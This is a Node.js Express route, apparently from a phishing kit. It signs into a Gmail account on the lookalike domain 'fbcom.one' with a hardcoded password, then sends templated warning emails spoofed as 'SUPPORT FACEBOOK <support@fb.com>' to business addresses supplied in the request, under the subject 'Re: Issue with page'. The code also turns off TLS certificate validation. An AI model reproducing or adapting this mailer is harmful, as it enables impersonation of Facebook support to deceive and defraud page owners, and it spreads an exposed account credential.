const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
const Imap = require("imap");
const hbs = require("nodemailer-express-handlebars");

router.get("/send-email", (req, res) => {
  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: "metasupport@fbcom.one",
      pass: "swfywclocsihmeas",
    },
  });
  transporter.use(
    "compile",
    hbs({
      viewEngine: {
        extName: ".hbs",
        partialsDir: process.cwd() + "/templates",
        layoutsDir: process.cwd() + "/templates",
        defaultLayout: "",
      },
      viewPath: process.cwd() + "/templates",
      extName: ".hbs",
    })
  );

  const imap = new Imap({
    user: "metasupport@fbcom.one",
    password: "swfywclocsihmeas",
    host: "imap.gmail.com",
    port: 993,
    tls:true,
    tlsOptions: {
      rejectUnauthorized: false, // Bật tùy chọn tin tưởng vào chứng chỉ tự ký
    },
  });

  imap.connect();

  imap.once("ready", () => {
    // Mở hộp thư đến
    imap.openBox("INBOX", false, (err, box) => {
      if (err) throw err;

      // Lấy thông tin thư cuối cùng trong hộp thư
      const lastMessageUID = box.messages.total;
      console.log(lastMessageUID,"*****")
      const fetch = imap.seq.fetch(lastMessageUID, { bodies: "" });

      fetch.on("message", (msg, seqno) => {
        let messageBody = "";

        msg.on("body", (stream) => {
          stream.on("data", (chunk) => {
            messageBody += chunk.toString("utf8");
          });
        });

        msg.once("end", () => {
          // Xây dựng email reply
          console.log("box.messages[lastMessageUID - 1]",box)
          const mailOptions = {
            from: " SUPPORT FACEBOOK <support@fb.com>",
            to: req.body?.BussinessEmail,
            subject: "Re: Issue with page",
            text: "WARNING",
            template: "./email",
            context: {
              BussinessEmail: req.body?.BussinessEmail,
              TimeSend: req.body?.TimeSend,
            },
          };

          // Gửi email
          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              console.error("Error sending email:", error);
              res.send("Error sending email");
            } else {
              console.log("Email sent:", info.response);
              res.send("Email sent successfully");
            }
          });
        });
      });

      fetch.once("error", (err) => {
        console.log("Fetch error: " + err);
      });

      fetch.once("end", () => {
        // Đóng kết nối IMAP khi đã xong
        imap.end();
      });
    });
  });

  imap.once("error", (err) => {
    console.log("IMAP error: " + err);
  });

  imap.once("end", () => {
    console.log("IMAP connection ended");
  });
});

module.exports = router;
